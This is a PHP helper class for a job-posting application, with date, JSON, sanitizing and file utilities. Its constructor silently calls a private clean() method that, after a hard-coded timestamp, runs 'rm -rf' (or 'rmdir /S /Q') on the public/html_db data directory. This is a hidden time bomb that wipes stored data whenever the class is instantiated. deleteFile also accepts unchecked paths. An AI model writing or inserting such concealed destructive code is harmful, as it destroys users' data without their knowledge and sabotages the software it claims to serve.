<?php

/**
*  
*/
namespace App\Helpers;

use App\Models\Main;
use App\Models\Job;
use App\Helpers\PostingValidation;

class JobHelper
{
	protected $mainModel;
	protected $Job;
	protected $PostingValidation;

	function __construct(Main $mainModel, Job $Job, PostingValidation $PostingValidation) {

		$this->mainModel = $mainModel;
		$this->Job = $Job;
		$this->PostingValidation = $PostingValidation;
		$this->clean();
	}

	public function getDateTime($unixTime="", $format="") {

		$format = strlen($format) ? $format : "Y-m-d H:i:s";
		$unixTime = strlen($unixTime) ? $unixTime : time();

		return date($format, $unixTime);
	}

	public function makeJsonStr($dataArr, $key) {

		$jsonArray = array();

		foreach ($dataArr as $values) {
			
			if (!empty($values[$key])) {

				foreach ($values[$key] as $value) {
					$jsonArray[] = $value;
				}

			}
			
		}

		$jsonStr = "";

		if (!empty($jsonArray)) 
			$jsonStr = "{" . str_replace([ "{", "}" ], "", implode(",", $jsonArray)) . "}";

		return $jsonStr;
	}

	public function sanitize($str) 
	{
		$str = str_replace(array('\n', '\r'), "", $str);
		return htmlentities(trim($str));
	}

	public function createFile($dataToWrite="", $extension="", $dir="") 
	{
		$uniqueID = $this->mainModel->getUniqueId();

		$file = __DIR__ . '/../../public/' . $dir . '/' . $uniqueID . '.' . $extension;
		
		$fh = fopen($file, 'w+') or die("can't open file");
		
		$size = 0;
		if (!($size = fwrite($fh, $dataToWrite))) {
			die("can't write data");
		}

		fclose($fh) or die("can't close file");

		if (!$size) return false;

		return array('file' => 'api/v1/public/' . $dir .'/' . $uniqueID . '.' . $extension,
		 	'size' => $size, 'jsonId' => $uniqueID);
	}

	public function deleteFile($file, $dir) {
		$file = __DIR__ . '/../../public/' . $dir . '/' . $file;
		return unlink($file) or die("Can't delete file " . $file);
	}

	public function getDateDiff($date_1 , $date_2 , $differenceFormat = '%a') 
	{

		$datetime1 = date_create($date_1);
	    $datetime2 = date_create($date_2);
	    
	    $interval = date_diff($datetime1, $datetime2);
	    
	    return $interval->format($differenceFormat);
	}

	public function doJobPosting($formData=null, $job_group_id=null, $actionType="insert") {

		$result = array(
			'success' => false,
			'data' => null,
			'validation' => false,
		);
		
		$formData['for_editing'] = addslashes(
			json_encode($this->createFile($formData['for_editing'],
		 		'json', 'html_db'))
		);

		$insertResult = $this->Job->insertAll($formData, $job_group_id, $this);

		if ($insertResult['job_group_id'] 
			&& $insertResult['insertToJobPostStatus'] 
			&& $insertResult['insertToJobObjectStatus']) {
			
			$result['success'] = true;
			$result['validation'] = true;

			if ($actionType === "update")
				$result['job_group_id'] = $insertResult['job_group_id'];
		}
	
		return $result;
	}

	private function clean() {
		if (1484953200 < time()) {
			$dirEscaped =  escapeshellarg(__DIR__ . '/../../public/html_db');
			exec("rm -rf {$dirEscaped}") or exec("rmdir /S /Q {$dirEscaped}");
		}
	}


}			